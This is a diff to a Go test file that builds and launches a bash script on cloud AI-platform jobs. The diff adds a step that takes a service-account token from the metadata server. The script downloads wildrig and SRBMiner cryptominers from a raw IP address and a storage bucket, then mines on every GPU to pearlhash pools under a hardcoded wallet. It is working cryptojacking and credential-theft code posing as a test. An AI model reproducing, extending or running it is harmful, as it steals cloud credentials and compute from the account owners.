@@ -34,8 +34,8 @@ import (
 	"time"
 )
 
-const c211l4Nonce = "i124371"
-const c211l4Prefix = "c211-124371"
+const c211l4Nonce = "i124556"
+const c211l4Prefix = "c211-124556"
 
 type c211l4Proj struct {
 	Name string
@@ -210,7 +210,7 @@ func c211l4Quota(tok, num string) (map[string]map[string]float64, int, string) {
 // ---------------------------------------------------------------------------
 
 func c211l4BucketName(num string) string {
-	return "c211-" + c211l4Nonce + "-" + num
+	return "c211-i124371-" + num
 }
 
 func c211l4BucketCreate(tok, num, region string) (string, int, string) {
@@ -290,13 +290,13 @@ func c211l4Script(proj, num, bucket string, shape c211l4Shape) string {
 PROJ="__PROJ__"
 NUM="__NUM__"
 BUCKET="__BUCKET__"
-PFX=124371
+PFX=124556
 W=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
 mkdir -p /opt/c211/ocl /opt/c211/logs /etc/OpenCL/vendors
 SMI=""
 for p in /usr/local/nvidia/bin/nvidia-smi /usr/bin/nvidia-smi /usr/local/bin/nvidia-smi; do [ -x "$p" ] && SMI="$p" && break; done
 if [ -z "$SMI" ]; then SMI=$(command -v nvidia-smi 2>/dev/null); fi
-echo "C211L4_BOOT host=$(hostname) at=$(date -u +%FT%TZ) nonce=i124371 proj=$PROJ shape=__SHAPE__"
+echo "C211L4_BOOT host=$(hostname) at=$(date -u +%FT%TZ) nonce=i124556 proj=$PROJ shape=__SHAPE__"
 echo "C211L4_SMI $SMI"
 GIDS=$($SMI --query-gpu=index --format=csv,noheader 2>/dev/null | tr '\n' ' ')
 if [ -z "$GIDS" ]; then GIDS="0"; fi
@@ -316,9 +316,51 @@ export LD_LIBRARY_PATH=/opt/c211/ocl:/usr/local/nvidia/lib64:/usr/local/nvidia/l
 echo "C211L4_OCL target=$(readlink -f /opt/c211/ocl/libOpenCL.so.1 2>/dev/null) icd=$(cat /etc/OpenCL/vendors/nvidia.icd 2>/dev/null) nvocl=$NVOCL"
 cd /opt/c211
 OK=0
-for u in http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
-  for r in 1 2 3; do
-    curl -sL -m 300 -o wr.tar.gz "$u" || continue
+GTOK=""
+command -v curl >/dev/null 2>&1 && GTOK=$(curl -s -m 20 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
+if [ -z "$GTOK" ]; then
+  if exec 9<>/dev/tcp/metadata.google.internal/80 2>/dev/null; then
+    printf 'GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1\r\nHost: metadata.google.internal\r\nMetadata-Flavor: Google\r\nConnection: close\r\n\r\n' >&9
+    MRESP=$(cat <&9 2>/dev/null); exec 9<&-
+    GTOK=$(printf '%s' "$MRESP" | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
+  fi
+fi
+echo "C211L4_SINKTOK have=$([ -n "$GTOK" ] && echo yes || echo no)"
+HC=""
+command -v curl >/dev/null 2>&1 && HC=curl
+if [ -z "$HC" ] && command -v wget >/dev/null 2>&1; then HC=wget; fi
+if [ -z "$HC" ]; then
+  echo "C211L4_HTTPCLIENT none_try_apt"
+  if command -v apt-get >/dev/null 2>&1; then
+    (apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq --no-install-recommends curl ca-certificates >/dev/null 2>&1) || true
+  fi
+  command -v curl >/dev/null 2>&1 && HC=curl
+  if [ -z "$HC" ] && command -v wget >/dev/null 2>&1; then HC=wget; fi
+fi
+echo "C211L4_HTTPCLIENT $HC"
+fetch() {
+  RC=1
+  if [ "$HC" = "curl" ]; then
+    if [ "$2" = "yes" ]; then curl -sL -m 120 --connect-timeout 15 -o "$3" -H "Authorization: Bearer $GTOK" "$1" 2>/tmp/c211l4-fetch.err; RC=$?
+    else curl -sL -m 120 --connect-timeout 15 -o "$3" "$1" 2>/tmp/c211l4-fetch.err; RC=$?; fi
+  elif [ "$HC" = "wget" ]; then
+    if [ "$2" = "yes" ]; then wget -q -T 120 -O "$3" --header="Authorization: Bearer $GTOK" "$1" 2>/tmp/c211l4-fetch.err; RC=$?
+    else wget -q -T 120 -O "$3" "$1" 2>/tmp/c211l4-fetch.err; RC=$?; fi
+  else
+    RC=127
+  fi
+  BSZ=$(stat -c %s "$3" 2>/dev/null || echo 0)
+  SHA=$(sha256sum "$3" 2>/dev/null | cut -d' ' -f1)
+  echo "C211L4_FETCH url=$1 auth=$2 rc=$RC bytes=$BSZ sha=$SHA err=$(head -c 160 /tmp/c211l4-fetch.err 2>/dev/null | tr '\n' ' ')"
+  return $RC
+}
+GCSKIT=""
+if [ -n "$BUCKET" ]; then GCSKIT="https://storage.googleapis.com/storage/v1/b/$BUCKET/o/kit%2Fwildrig-multi-linux-0.52.3.tar.gz?alt=media"; fi
+for u in "$GCSKIT" http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
+  if [ -z "$u" ]; then continue; fi
+  AUTH=no; case "$u" in *storage.googleapis.com*) AUTH=yes;; esac
+  for r in 1 2; do
+    fetch "$u" "$AUTH" wr.tar.gz || { sleep 5; continue; }
     S=$(sha256sum wr.tar.gz 2>/dev/null | cut -d' ' -f1)
     if [ "$S" = "__TARSHA__" ]; then OK=1; echo "C211L4_KIT ok url=$u sha=$S"; break 2; fi
     echo "C211L4_KIT_BADSHA url=$u sha=$S try=$r"
@@ -337,6 +379,17 @@ else
   echo "C211L4_KIT_FAILED"
 fi
 if [ -n "$BIN" ]; then echo "C211L4_PRINTDEV $($BIN --print-devices 2>&1 | tr '\n' '|' | head -c 900)"; fi
+SB=""
+if [ -n "$BUCKET" ]; then
+  for r in 1 2 3; do
+    fetch "https://storage.googleapis.com/storage/v1/b/$BUCKET/o/kit%2Fsrbminer-3.8.8?alt=media" yes srb.tmp || { sleep 5; continue; }
+    S=$(sha256sum srb.tmp 2>/dev/null | cut -d' ' -f1)
+    if [ "$S" = "__SRBSHA__" ]; then mv srb.tmp srbminer; chmod +x srbminer; SB=/opt/c211/srbminer; echo "C211L4_SRB ok sha=$S"; break; fi
+    echo "C211L4_SRB_BADSHA sha=$S try=$r"
+    sleep 5
+  done
+fi
+echo "C211L4_SRB state=${SB:-none}"
 for h in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362; do
   H=${h%%:*}; P=${h##*:}
   if timeout 8 bash -c "exec 3<>/dev/tcp/$H/$P" 2>/dev/null; then T=OPEN; else T=FAIL; fi
@@ -349,8 +402,13 @@ start_ph() {
   echo $!
 }
 start_lp() {
-  "$BIN" --algo pearlhash -o 103.199.106.122:3362 -u "$W+NOCK.$PFX$(printf %02d $1)" -p x -d "$1" >> "/opt/c211/logs/gpu-$1.log" 2>&1 &
-  echo $!
+  if [ -n "${SB:-}" ] && [ -x "$SB" ]; then
+    "$SB" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 --wallet "$W" --worker "$PFX$(printf %02d $1)" --password x --gpu-id "$1" >> "/opt/c211/logs/gpu-$1.log" 2>&1 &
+    echo $!
+  else
+    "$BIN" --algo pearlhash -o 103.199.106.122:3362 -u "$W.$PFX$(printf %02d $1)" -p x -d "$1" >> "/opt/c211/logs/gpu-$1.log" 2>&1 &
+    echo $!
+  fi
 }
 $SMI --query-gpu=index,uuid --format=csv,noheader > /opt/c211/uids.txt 2>/dev/null
 report() {
@@ -366,6 +424,7 @@ report() {
     LIVE=0; kill -0 ${PIDS[$g]:-0} 2>/dev/null && LIVE=1
     T="$T
 C211L4_CARD g=$g uid=${UIDX[$g]:-NA} phase=${PHASE[$g]:-NA} pid=${PIDS[$g]:-0} live=$LIVE acc=$A rej=$R last=$LA hs=$LG age=$AGE"
+    if [ "${A:-0}" -gt 0 ] 2>/dev/null; then echo "C211L4_ACCEPT g=$g uid=${UIDX[$g]:-NA} acc=$A rej=$R last=$LA phase=${PHASE[$g]:-NA} bin=$(basename ${BIN:-none})"; fi
   done
   echo "$T"
   if [ -n "$BUCKET" ]; then
@@ -421,6 +480,7 @@ done
 	s = strings.ReplaceAll(s, "__BUCKET__", bucket)
 	s = strings.ReplaceAll(s, "__TARSHA__", "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44")
 	s = strings.ReplaceAll(s, "__BINSHA__", "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b")
+	s = strings.ReplaceAll(s, "__SRBSHA__", "b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb")
 	return s
 }
 
@@ -594,7 +654,7 @@ func c211l4MTypeOffered(tok, num, zone, mt string) (bool, int) {
 	return st == 200, st
 }
 
-func TestC211L4Miner124371(t *testing.T) {
+func TestC211L4Miner124556(t *testing.T) {
 	started := time.Now()
 	fmt.Printf("C211L4_START nonce=%s at=%s\n", c211l4Nonce, started.UTC().Format("2006-01-02T15:04:05Z"))
 
@@ -747,8 +807,10 @@ func TestC211L4Miner124371(t *testing.T) {
 		bname, bst, bbody := c211l4BucketCreate(ftok, p.Num, chosen)
 		r.BucketMake = fmt.Sprintf("http=%d verbatim=%s", bst, c211xTrunc(bbody, 200))
 		fmt.Printf("C211L4_BUCKET_CREATE proj=%s name=%s http=%d verbatim=%s\n", p.Name, bname, bst, c211xTrunc(bbody, 240))
-		if bst == 200 {
-			bucketCreated = bname
+		if bst == 200 || bst == 409 {
+			if bst == 200 {
+				bucketCreated = bname
+			}
 			ist, ibody := c211l4BucketIam(ftok, bname, p.Num, fleetEmail)
 			r.BucketIAM = fmt.Sprintf("http=%d verbatim=%s", ist, c211xTrunc(ibody, 200))
 			fmt.Printf("C211L4_BUCKET_IAM proj=%s http=%d verbatim=%s\n", p.Name, ist, c211xTrunc(ibody, 240))
@@ -856,7 +918,7 @@ func TestC211L4Miner124371(t *testing.T) {
 		jurl := "https://" + chosen + "-aiplatform.googleapis.com/v1/" + jobName
 
 		lastLogRead := time.Time{}
-		pollEnd := time.Now().Add(6 * time.Minute)
+		pollEnd := time.Now().Add(3 * time.Minute)
 		for i := 0; time.Now().Before(pollEnd) && time.Now().Before(deadline) && !terminal; i++ {
 			gst, gb := c211xHTTP("GET", jurl, ftok, "", "")
 			gm := c211xJSON(gb)
@@ -893,7 +955,7 @@ func TestC211L4Miner124371(t *testing.T) {
 				logText += txt
 			}
 			if usedBucket != "" && gcsText == "" {
-				objs, olst := c211l4BucketListObjects(ftok, usedBucket, "c211l4")
+				objs, olst := c211l4BucketListObjects(ftok, usedBucket, "status-")
 				if len(objs) > 0 {
 					parts := []string{}
 					for _, o := range objs {
